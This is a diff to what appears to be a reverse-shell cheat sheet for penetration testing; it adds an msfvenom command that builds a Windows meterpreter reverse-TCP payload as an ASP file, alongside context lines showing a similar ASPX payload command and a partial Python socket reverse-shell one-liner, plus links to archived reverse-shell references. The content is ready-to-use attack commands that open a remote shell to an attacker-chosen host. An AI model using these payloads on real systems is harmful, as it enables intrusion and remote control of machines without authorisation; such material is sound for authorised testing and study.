@@ -65,6 +65,12 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
 ```
 
+### asp (asp.net)
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+```
+
 ## References
 - [Pentestmonkey Reverse Shell Cheatsheet](http://web.archive.org/web/20180702062128/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [Reverse shell with bash](http://web.archive.org/web/20180625050916/http://www.gnucitizen.org/blog/reverse-shell-with-bash/)
